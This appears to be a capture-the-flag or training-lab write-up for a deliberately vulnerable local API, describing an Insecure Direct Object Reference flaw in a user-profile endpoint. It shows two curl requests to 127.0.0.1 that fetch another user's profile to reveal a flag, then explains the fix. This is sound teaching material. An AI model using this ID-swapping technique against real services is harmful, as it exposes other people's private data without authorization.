# 01 — IDOR: read another user's profile

**Category:** Authorization · **MASVS-AUTH-1** · **Difficulty:** easy

## The flaw
`GET /api/users/{id}/profile` returns the requested user record based solely on
the `id` in the URL. It never checks that the authenticated caller actually *is*
that user (or is allowed to view them). This is a classic **Insecure Direct
Object Reference** / horizontal privilege escalation.

## Exploit
```bash
curl http://127.0.0.1:8000/api/users/1/profile   # your own profile
curl http://127.0.0.1:8000/api/users/2/profile   # someone else's — flag in "note"
```

The response for user `2` includes the flag.

## Fix
Derive the user identity from the session/token, not the URL. Enforce that
`token.sub == id` (or an explicit admin grant) before returning the record.
Object-level authorization must be checked on **every** access.
